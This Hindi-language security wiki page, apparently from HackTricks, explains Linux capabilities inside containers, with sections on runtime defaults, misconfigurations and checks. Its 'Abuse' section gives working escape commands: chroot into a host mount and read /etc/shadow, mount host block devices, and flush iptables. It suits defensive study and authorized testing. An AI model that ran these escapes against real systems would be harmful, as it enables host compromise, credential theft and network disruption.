# Containers में Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux capabilities, container security के सबसे महत्वपूर्ण हिस्सों में से एक हैं, क्योंकि वे एक सूक्ष्म लेकिन मूलभूत प्रश्न का उत्तर देती हैं: **किसी container के अंदर "root" होने का वास्तव में क्या अर्थ है?** सामान्य Linux system पर UID 0 ऐतिहासिक रूप से privileges के एक बहुत बड़े set का संकेत देता था। आधुनिक kernels में इस privilege को capabilities नामक छोटी units में विभाजित किया गया है। यदि संबंधित capabilities हटा दी गई हों, तो कोई process root के रूप में चल सकता है और फिर भी कई शक्तिशाली operations करने में असमर्थ हो सकता है।

Containers इस अंतर पर बहुत अधिक निर्भर करते हैं। Compatibility या simplicity के कारण कई workloads को अभी भी container के अंदर UID 0 के रूप में launch किया जाता है। Capabilities drop किए बिना यह बहुत अधिक खतरनाक होता। Capabilities drop करने पर, containerized root process कई सामान्य in-container tasks कर सकता है, जबकि उसे अधिक sensitive kernel operations से रोका जा सकता है। इसी कारण `uid=0(root)` दिखाने वाला container shell अपने-आप "host root" या यहां तक कि "broad kernel privilege" का अर्थ नहीं रखता। Capability sets तय करते हैं कि उस root identity की वास्तविक शक्ति कितनी है।

पूर्ण Linux capability reference और कई abuse examples के लिए देखें:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities को कई sets में track किया जाता है, जिनमें permitted, effective, inheritable, ambient और bounding sets शामिल हैं। कई container assessments के लिए प्रत्येक set की exact kernel semantics तत्काल रूप से उतनी महत्वपूर्ण नहीं होतीं, जितना यह practical प्रश्न: **यह process अभी कौन-से privileged operations सफलतापूर्वक perform कर सकता है, और future privilege gains की कौन-सी संभावनाएं अभी भी मौजूद हैं?**

यह इसलिए महत्वपूर्ण है क्योंकि कई breakout techniques वास्तव में container problems के रूप में छिपी हुई capability problems होती हैं। `CAP_SYS_ADMIN` वाला workload kernel functionality की बहुत बड़ी मात्रा तक पहुंच सकता है, जिसे सामान्य container root process को access नहीं करना चाहिए। `CAP_NET_ADMIN` वाला workload तब और अधिक खतरनाक हो जाता है, जब वह host network namespace भी share करता हो। `CAP_SYS_PTRACE` वाला workload तब अधिक interesting हो जाता है, जब वह host PID sharing के माध्यम से host processes देख सके। Docker या Podman में यह `--pid=host` के रूप में दिखाई दे सकता है; Kubernetes में यह आमतौर पर `hostPID: true` के रूप में दिखाई देता है।

दूसरे शब्दों में, capability set का मूल्यांकन isolation में नहीं किया जा सकता। इसे namespaces, seccomp और MAC policy के साथ मिलाकर पढ़ना आवश्यक है।

## Lab

किसी container के अंदर capabilities inspect करने का एक बहुत सीधा तरीका है:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
आप एक अधिक प्रतिबंधात्मक container की तुलना उस container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
सीमित addition का प्रभाव देखने के लिए, सब कुछ हटाकर केवल एक capability फिर से जोड़ने का प्रयास करें:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
इन छोटे प्रयोगों से यह स्पष्ट करने में मदद मिलती है कि runtime केवल "privileged" नामक boolean को toggle नहीं कर रहा है। वह process के लिए उपलब्ध वास्तविक privilege surface को आकार दे रहा है।

## High-Risk Capabilities

हालांकि target के आधार पर कई capabilities महत्वपूर्ण हो सकती हैं, container escape analysis में कुछ capabilities बार-बार प्रासंगिक होती हैं।

**`CAP_SYS_ADMIN`** वह capability है जिस पर defenders को सबसे अधिक संदेह करना चाहिए। इसे अक्सर "the new root" कहा जाता है, क्योंकि यह mount-related operations, namespace-sensitive behavior और कई ऐसे kernel paths सहित बहुत बड़ी मात्रा में functionality को unlock करती है, जिन्हें containers के सामने कभी भी लापरवाही से expose नहीं किया जाना चाहिए। यदि किसी container में `CAP_SYS_ADMIN`, weak seccomp और strong MAC confinement का अभाव है, तो कई classic breakout paths काफी अधिक realistic हो जाते हैं।

**`CAP_SYS_PTRACE`** तब महत्वपूर्ण होती है जब process visibility उपलब्ध हो, विशेष रूप से तब जब PID namespace host या किसी महत्वपूर्ण neighboring workload के साथ shared हो। यह visibility को tampering में बदल सकती है।

Network-focused environments में **`CAP_NET_ADMIN`** और **`CAP_NET_RAW`** महत्वपूर्ण होती हैं। Isolated bridge network पर भी ये पहले से risky हो सकती हैं; shared host network namespace पर स्थिति और भी खराब होती है, क्योंकि workload host networking को reconfigure करने, traffic को sniff या spoof करने अथवा local traffic flows में interference करने में सक्षम हो सकता है।

Rootful environment में **`CAP_SYS_MODULE`** आमतौर पर catastrophic होती है, क्योंकि kernel modules load करना प्रभावी रूप से host-kernel control के समान है। General-purpose container workload में यह लगभग कभी भी मौजूद नहीं होनी चाहिए।

## Runtime Usage

Docker, Podman, containerd-based stacks और CRI-O सभी capability controls का उपयोग करते हैं, लेकिन इनके defaults और management interfaces अलग-अलग होते हैं। Docker इन्हें `--cap-drop` और `--cap-add` जैसे flags के माध्यम से सीधे expose करता है। Podman भी इसी तरह के controls expose करता है और rootless execution से अक्सर एक additional safety layer का लाभ मिलता है। Kubernetes Pod या container `securityContext` के माध्यम से capability additions और drops को surface करता है। LXC/Incus जैसे System-container environments भी capability control पर निर्भर करते हैं, लेकिन इन systems का broader host integration अक्सर operators को app-container environment की तुलना में defaults को अधिक aggressively relax करने के लिए प्रेरित करता है।

इन सभी में यही principle लागू होता है: किसी capability को technically grant किया जा सकता है, इसका अर्थ यह नहीं है कि उसे grant किया जाना चाहिए। कई real-world incidents तब शुरू होते हैं जब कोई operator केवल इसलिए capability add कर देता है क्योंकि stricter configuration में workload fail हो गया था और team को quick fix की आवश्यकता थी।

## Misconfigurations

सबसे obvious mistake Docker/Podman-style CLIs में **`--cap-add=ALL`** है, लेकिन यह एकमात्र समस्या नहीं है। व्यवहार में, एक अधिक common problem यह है कि "make the application work" के लिए एक या दो अत्यंत powerful capabilities, विशेष रूप से `CAP_SYS_ADMIN`, grant कर दी जाती हैं, जबकि namespace, seccomp और mount implications को भी समझा नहीं जाता। एक अन्य common failure mode extra capabilities को host namespace sharing के साथ combine करना है। Docker या Podman में यह `--pid=host`, `--network=host` या `--userns=host` के रूप में दिखाई दे सकता है; Kubernetes में equivalent exposure आमतौर पर `hostPID: true` या `hostNetwork: true` जैसी workload settings के माध्यम से दिखाई देता है। इनमें से प्रत्येक combination यह बदलता है कि capability वास्तव में किन चीजों को affect कर सकती है।

Administrators अक्सर यह भी मान लेते हैं कि क्योंकि workload पूरी तरह `--privileged` नहीं है, इसलिए वह अभी भी meaningful रूप से constrained है। कभी-कभी यह सही होता है, लेकिन कभी-कभी effective posture पहले ही privileged के इतना करीब पहुंच चुका होता है कि operationally यह distinction मायने रखना बंद कर देता है।

## Abuse

पहला practical step effective capability set को enumerate करना और तुरंत उन capability-specific actions को test करना है जो escape या host information access के लिए महत्वपूर्ण हो सकते हैं:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
यदि `CAP_SYS_ADMIN` मौजूद है, तो mount-based abuse और host filesystem access को पहले जांचें, क्योंकि यह breakout को सक्षम करने वाले सबसे सामान्य तरीकों में से एक है:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
यदि `CAP_SYS_PTRACE` मौजूद है और container interesting processes देख सकता है, तो verify करें कि इस capability को process inspection में बदला जा सकता है:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
यदि `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद है, तो जाँचें कि क्या workload दिखाई देने वाले network stack में हेरफेर कर सकता है या कम-से-कम उपयोगी network intelligence एकत्र कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
जब कोई capability test सफल होता है, तो उसे namespace situation के साथ मिलाकर देखें। Isolated namespace में केवल risky दिखने वाली capability, container के host PID, host network या host mounts को भी share करने पर तुरंत escape या host-recon primitive बन सकती है।

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

यदि container में `CAP_SYS_ADMIN` और host filesystem का writable bind mount, जैसे `/host`, मौजूद है, तो escape path अक्सर सीधा होता है:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
यदि `chroot` सफल होता है, तो commands अब host root filesystem context में execute होते हैं:
```bash
id
hostname
cat /etc/shadow | head
```
यदि `chroot` उपलब्ध नहीं है, तो mounted tree के माध्यम से binary को call करके अक्सर वही परिणाम प्राप्त किया जा सकता है:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + Device Access

यदि host का कोई block device exposed हो, तो `CAP_SYS_ADMIN` उसे सीधे host filesystem access में बदल सकता है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### पूर्ण उदाहरण: `CAP_NET_ADMIN` + Host Networking

यह combination हमेशा सीधे host root प्राप्त नहीं करता, लेकिन यह host network stack को पूरी तरह reconfigure कर सकता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह denial of service, traffic interception या उन services तक access को सक्षम कर सकता है जिन्हें पहले filter किया गया था।

## Checks

capability checks का goal केवल raw values को dump करना नहीं है, बल्कि यह समझना है कि क्या process के पास अपने वर्तमान namespace और mount situation को dangerous बनाने के लिए पर्याप्त privilege है।
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
यहाँ क्या महत्वपूर्ण है:

- `capsh --print` high-risk capabilities जैसे `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, या `cap_sys_module` को पहचानने का सबसे आसान तरीका है।
- `/proc/self/status` में `CapEff` line बताती है कि इस समय वास्तव में क्या effective है, न कि केवल यह कि अन्य sets में क्या उपलब्ध हो सकता है।
- यदि container host PID, network, या user namespaces को भी share करता है, या इसमें writable host mounts हैं, तो capability dump अधिक महत्वपूर्ण हो जाता है।

Raw capability information एकत्र करने के बाद अगला step interpretation है। जाँचें कि process root है या नहीं, user namespaces active हैं या नहीं, host namespaces shared हैं या नहीं, seccomp enforcing है या नहीं, और क्या AppArmor या SELinux अभी भी process को restrict कर रहे हैं। Capability set अपने-आप में पूरी कहानी नहीं बताता, लेकिन अक्सर यही वह हिस्सा होता है जो समझाता है कि एक container breakout क्यों काम करता है और दूसरे में उसी apparent starting point के बावजूद failure क्यों होता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Default रूप से reduced capability set | Docker capabilities की एक default allowlist बनाए रखता है और बाकी को drop कर देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Default रूप से reduced capability set | Podman containers default रूप से unprivileged होते हैं और reduced capability model का उपयोग करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | बदलाव न होने पर runtime defaults inherit करता है | यदि `securityContext.capabilities` specify नहीं किए गए हैं, तो container को runtime से default capability set मिलता है | `securityContext.capabilities.add`, `drop: [\"ALL\"]` न करना, `privileged: true` |
| containerd / CRI-O under Kubernetes | आमतौर पर runtime default | Effective set runtime और Pod spec पर निर्भर करता है | Kubernetes row के समान; direct OCI/CRI configuration capabilities को explicitly add भी कर सकती है |

Kubernetes के लिए महत्वपूर्ण बात यह है कि API कोई एक universal default capability set define नहीं करता। यदि Pod capabilities को add या drop नहीं करता है, तो workload उस node के runtime default को inherit करता है।

{{#include ../../../../banners/hacktricks-training.md}}
